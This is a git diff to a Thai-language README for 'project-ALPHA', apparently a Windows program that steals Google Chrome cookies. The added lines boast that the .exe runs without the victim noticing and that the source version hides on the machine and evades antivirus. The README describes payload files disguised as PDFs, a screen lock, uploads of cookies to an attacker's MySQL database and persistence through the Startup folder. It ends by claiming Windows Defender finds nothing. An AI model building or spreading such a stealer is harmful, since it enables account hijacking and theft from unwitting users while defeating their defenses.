@@ -33,6 +33,19 @@ https://github.com/qwer007xxs/project-ALPHA/releases/tag/project-ALPHA เท่
 /!\ข้อจำกัด/!\
 ต้อง run โปรแกรม ตอนปิด google chrome เท่านั้นไม่ว่าจะเป็น source code หรือ .exe
 ไม่งั้น error permission
+
+
+**.EXE vs source code**
+.EXE
+- ไม่มี command line ในการแจ้งเตือน
+- ทำงานได้โดยที่ user ไม่สงใส
+- run ได้แค่ windows 10
+source code
+- ทำการซ่อนตัวอยู่ในเครื่องของผู้ใช้
+- anti-virus scan ไม่เจอ
+- มี command line run ในระหว่างการทำงาน
+- run ได้ทั้ง windows 10/11
+
   
 **วิธี run program**
 1. แก้ไขโปรแกรมในโฟลเดอร์ source code
@@ -52,16 +65,20 @@ https://github.com/qwer007xxs/project-ALPHA/releases/tag/project-ALPHA เท่
  conn = mysql.connector.connect(host="host", user="host", password=password", database="database")
  ```
 4.0 (source code)หากตองการ run program ต้องปลี่ยนนามสกุล file เป็น tab.py เป็น tab.pdf และ hidden.bat เป็น hidden.pdf
-4.1 (exe)หากตองการ run program จะต้อง compile file ที่ชื่อว่า onefile.py ใน 
+4.1 (exe)หากตองการ run program exe จะต้อง compile file ที่ชื่อว่า onefile.py ใน 
 https://github.com/qwer007xxs/project-ALPHA/releases/tag/project-ALPHA
 
-**หลักการทำงานของโปรแกรม**
+**หลักการทำงานของโปรแกรม(source code)**
 1. อันดับแรกโปรแกรมจะทำการล็อคหน้าจอของผู้ใช้ 
 2. โปรแกรมจะเปลี่ยนนามสกุลไฟล์ hidden.pdf และ tab.pdf เปลี่ยนเป็น hidden.bat และ tab.py ตามลำดับ
 3. ถ้าหากว่าในเครื่องนั้นไม่ได้ติดตั้ง python เอาไว้โปรแกรมก็จะทำการลง python จากไฟล์ python installer .bat
 4. จากนั้นก็จะ run ไฟล์ tab.py
 5. โดย tab.py จะทำการดึงคุกกี้จาก google chrome ออกมาและทำการอัพโหลดไปที่ Database server ที่ตั้งค่าเอาไว้
 6. หลังจากนั้นโปรแกรมตัวนี้จะทำการซ่อนตัวอยู่ในเครื่องของผู้ใช้โดยที่ hidden.pdf จะทำการฝังตัวเองไว้ใน Start Up และ tab.pdf จะถูก copy ไปที่ userprofile folder
+   
+**หลักการทำงานของโปรแกรม(exe)**
+1.หลังจาก click .exe file ก็ทำการดึงคุกกี้จาก google chrome ออกมาและทำการอัพโหลดไปที่ Database server ที่ตั้งค่าเอาไว้ 
+ โดยในระหว่างการทำงานหน้าจอ user จะไม่มีอะไรเกิดขึ้น
 
 **ผลลัพธ์**
 - จากกันที่นำไฟล์ของโปรแกรมเราทั้งหมดมาสแกนด้วย Third party anti-virus และของ Windows defender นั้นพบว่าไม่สามารถตรวจพบไวรัสหรือความผิดปกติใดๆ
